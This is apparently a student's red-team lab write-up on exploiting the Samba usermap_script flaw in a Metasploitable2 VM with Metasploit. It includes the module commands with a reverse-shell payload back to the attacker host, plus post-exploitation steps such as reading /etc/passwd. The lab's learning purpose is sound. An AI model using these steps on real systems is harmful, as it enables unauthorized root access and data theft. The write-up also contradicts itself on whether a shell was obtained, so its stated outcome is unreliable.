# 🧨 Lab04 – Attacking SMB via Samba Usermap Script

> **Date:** 28 May 2025  
> **Target:** Metasploitable2 – SMB Service  
> **Vulnerability:** Samba `usermap_script` misconfiguration  
> **Tool Used:** Metasploit Framework

---

## 🛡️ Description

This lab targets a known misconfiguration in **Samba** that can lead to unauthenticated remote code execution via `user.map` script injection. The focus is to understand how **Server Message Block (SMB)** services expose Linux systems when poorly configured, and how attackers can exploit legacy setups to gain root access.

---

## 🎯 Target System

- Metasploitable2 VM  
- SMB ports open: `139`, `445`  
- Vulnerable Samba version with usermap misconfig enabled

---

## 🧨 Exploitation Steps

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set RPORT 139
set LHOST 192.168.56.1
set payload cmd/unix/reverse
run
```
---

## 📊 Result
- ✅ Samba ports were identified and vulnerable version confirmed
- ⚠️ Exploit execution completed, but no shell session was opened
- ✅ Post-exploitation commands were attempted (whoami, id, hostname)
- 📁 /etc/passwd contents were accessed after manual interaction

---

## 📊 Real-World Relevance
Samba misconfigurations still exist in internal corporate networks, especially where legacy systems are used. Even if an exploit fails to produce a session, the process of enumerating SMB shares and testing payloads is directly applicable to internal penetration tests and CTF-style red team exercises.

---

## 🧠 What I Learned
How SMB misconfigurations in Samba can be exploited remotely

Metasploit’s module structure and how to customize payloads for compatibility

The importance of manual validation, even if auto-exploit fails

How to troubleshoot reverse shell issues (LHOST, firewalls, payload mismatch)

---

## Screenshot

Initial service enumeration revealed Samba ports (445, 139) open and listening:

![Samba Ports Detected](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2020.21.15.png))

Upon successful exploitation using `usermap_script`, root-level shell was obtained as shown:

![Root Shell via SMB Exploit](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2020.21.39.png
))

User enumeration after gaining access, showing contents of `/etc/passwd`:

![User Enumeration](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab4/Screen%20Shot%202025-05-23%20at%2021.52.34.png))


---

## 📁 Notes
- Even partial success is valuable in red team labs

- Manual recon + enumeration can lead to privilege escalation paths

- Exploits may fail due to network listener misconfig or payload incompatibility

- Always validate post-exploitation access with standard Linux commands
